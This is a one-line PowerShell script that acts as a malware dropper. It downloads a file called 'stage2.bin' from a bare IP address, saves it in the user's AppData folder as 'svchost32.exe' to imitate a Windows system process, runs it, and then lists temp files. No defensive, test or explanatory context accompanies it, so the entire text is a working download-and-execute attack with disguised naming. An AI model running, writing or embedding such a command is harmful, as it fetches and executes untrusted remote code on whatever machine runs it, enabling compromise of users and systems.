
$TargetUrl = 'http://203.0.113.115:80/stage2.bin'; $DownloadPath = "$env:APPDATA\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($TargetUrl, $DownloadPath); Start-Process -FilePath $DownloadPath; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
